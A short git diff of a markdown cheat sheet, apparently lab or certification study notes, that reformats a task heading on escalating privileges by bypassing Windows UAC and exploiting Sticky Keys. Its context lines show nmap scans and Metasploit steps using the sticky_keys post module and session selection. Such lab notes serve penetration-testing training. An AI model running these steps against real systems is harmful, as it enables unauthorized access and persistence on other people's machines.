@@ -256,7 +256,8 @@ nmap 10.10.1.0/24
 nmap -A -sC -sV [IP]
 ```
 ```
-Task : Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys
+**Task : Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys**
+```
 Run mkdir /var/www/html/share command to create a shared folder
 Run chmod -R 755 /var/www/html/share command
 Run chown -R www-data:www-data /var/www/html/share command
@@ -289,7 +290,7 @@ post/windows/manage/sticky_keys
 sessions -i*
 set session 2
 exploit  
-
+```
 
 ```
 
